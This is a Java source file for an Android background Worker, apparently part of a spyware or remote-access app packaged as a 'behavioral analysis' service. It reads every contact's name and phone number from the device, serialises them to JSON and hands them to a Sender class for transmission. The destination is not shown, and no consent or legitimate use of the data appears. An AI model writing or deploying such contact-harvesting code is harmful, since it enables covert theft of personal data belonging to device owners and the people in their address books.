package com.behavioralanalysis.service;

import android.content.Context;
import android.database.Cursor;
import android.provider.ContactsContract;

import androidx.annotation.NonNull;
import androidx.work.Worker;
import androidx.work.WorkerParameters;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

public class Contacts extends Worker {
    public static final String TAG = "contact";
    private Context context;
    public Contacts(@NonNull Context context, @NonNull WorkerParameters workerParams) {
        super(context, workerParams);
        this.context = context;
    }

    @NonNull
    @Override
    public Result doWork() {
        try {
            JSONArray array = new JSONArray();
            Cursor cursor = MainService
                    .getContext()
                    .getContentResolver()
                    .query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            new String[]{ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME, ContactsContract.CommonDataKinds.Phone.NUMBER},
                            null,
                            null,
                            ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC"
                    );

            while (cursor.moveToNext()) {
                JSONObject object = new JSONObject();
                object.put(
                        "number",
                        cursor.getString(
                                cursor.getColumnIndex(
                                        ContactsContract.CommonDataKinds.Phone.NUMBER
                                )
                        )
                );
                object.put(
                        "name",
                        cursor.getString(
                                cursor.getColumnIndex(
                                        ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME
                                )
                        )
                );
                array.put(object);
            }

            Sender.send(TAG, array.toString());

            return Result.success();
        } catch (JSONException e) {
            return Result.failure();
        }
    }
}